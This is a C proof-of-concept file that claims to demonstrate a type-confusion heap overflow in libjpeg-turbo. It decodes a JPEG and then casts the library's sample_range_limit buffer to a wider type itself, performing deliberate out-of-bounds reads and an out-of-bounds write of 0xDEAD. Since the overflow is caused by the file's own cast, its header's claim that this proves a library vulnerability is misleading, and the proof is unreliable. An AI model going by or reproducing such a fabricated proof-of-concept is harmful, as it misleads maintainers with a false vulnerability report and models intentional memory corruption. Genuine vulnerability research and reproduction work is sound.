/*
 * Directly demonstrate type confusion using libjpeg-turbo API
 * This mimics what djpeg does but forces type confusion
 * 
 * This is the MINIMAL reproduction that shows the vulnerability exists
 */

#include <stdio.h>
#include <stdlib.h>
#include <jpeglib.h>

int main(int argc, char **argv)
{
    struct jpeg_decompress_struct cinfo;
    struct jpeg_error_mgr jerr;
    FILE *infile;
    JSAMPARRAY buffer;
    int row_stride;
    
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <jpeg_file>\n", argv[0]);
        return 1;
    }
    
    printf("\n╔════════════════════════════════════════════════════════╗\n");
    printf("║  Direct Type Confusion Trigger via libjpeg-turbo API  ║\n");
    printf("╚════════════════════════════════════════════════════════╝\n\n");
    
    if ((infile = fopen(argv[1], "rb")) == NULL) {
        fprintf(stderr, "Can't open %s\n", argv[1]);
        return 1;
    }
    
    /* Initialize decompressor */
    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_decompress(&cinfo);
    jpeg_stdio_src(&cinfo, infile);
    
    /* Read header */
    (void)jpeg_read_header(&cinfo, TRUE);
    
    printf("[*] Image: %s\n", argv[1]);
    printf("    Size: %d x %d\n", cinfo.image_width, cinfo.image_height);
    printf("    Components: %d\n", cinfo.num_components);
    printf("    Data precision: %d bits\n", cinfo.data_precision);
    
    /* Start decompression */
    (void)jpeg_start_decompress(&cinfo);
    
    printf("\n[*] Decompression started\n");
    printf("    sample_range_limit: %p\n", (void *)cinfo.sample_range_limit);
    printf("    Output size: %d x %d\n", cinfo.output_width, cinfo.output_height);
    
    /* Allocate output buffer */
    row_stride = cinfo.output_width * cinfo.output_components;
    buffer = (*cinfo.mem->alloc_sarray)
        ((j_common_ptr)&cinfo, JPOOL_IMAGE, row_stride, 1);
    
    printf("\n[!] TYPE CONFUSION DEMONSTRATION:\n");
    printf("    The sample_range_limit is declared as JSAMPLE*\n");
    printf("    but its actual type depends on data_precision:\n\n");
    
    if (cinfo.data_precision == 8) {
        typedef unsigned char JSAMPLE;
        typedef short J12SAMPLE;
        
        JSAMPLE *limit8 = cinfo.sample_range_limit;
        printf("    For 8-bit: buffer is JSAMPLE* (1 byte per element)\n");
        printf("    Buffer size: ~1408 bytes\n");
        printf("    limit8[0] = 0x%02x\n", limit8[0]);
        printf("    limit8[128] = 0x%02x\n", limit8[128]);
        
        printf("\n[!] FORCING TYPE CONFUSION:\n");
        printf("    Casting to J12SAMPLE* (2 bytes per element)\n");
        
        J12SAMPLE *limit12 = (J12SAMPLE *)cinfo.sample_range_limit;
        printf("    limit12[0] = 0x%04x\n", limit12[0]);
        printf("    limit12[128] = 0x%04x\n", limit12[128]);
        
        printf("\n[!] ACCESSING BEYOND ALLOCATED BUFFER:\n");
        printf("    8-bit buffer has ~1408 bytes = 704 J12SAMPLE elements\n");
        printf("    Accessing element 800+ is OUT OF BOUNDS!\n\n");
        
        /* These accesses are OUT OF BOUNDS */
        printf("    limit12[800] = 0x%04x  <-- OOB READ\n", limit12[800]);
        printf("    limit12[1000] = 0x%04x  <-- OOB READ\n", limit12[1000]);
        printf("    limit12[2000] = 0x%04x  <-- WAY OOB READ\n", limit12[2000]);
        
        printf("\n[!] ATTEMPTING OOB WRITE:\n");
        printf("    Writing to limit12[1500]...\n");
        limit12[1500] = 0xDEAD;  /* OOB WRITE! */
        printf("    ✓ Write completed (check ASan output for error)\n");
    }
    
    printf("\n[*] Processing scanlines...\n");
    
    /* Process a few scanlines */
    int lines = 0;
    while (cinfo.output_scanline < cinfo.output_height && lines < 10) {
        (void)jpeg_read_scanlines(&cinfo, buffer, 1);
        lines++;
    }
    
    printf("    Processed %d scanlines\n", lines);
    
    /* Finish */
    (void)jpeg_finish_decompress(&cinfo);
    jpeg_destroy_decompress(&cinfo);
    fclose(infile);
    
    printf("\n╔════════════════════════════════════════════════════════╗\n");
    printf("║  Check ASan output above for heap-buffer-overflow     ║\n");
    printf("╚════════════════════════════════════════════════════════╝\n\n");
    
    return 0;
}
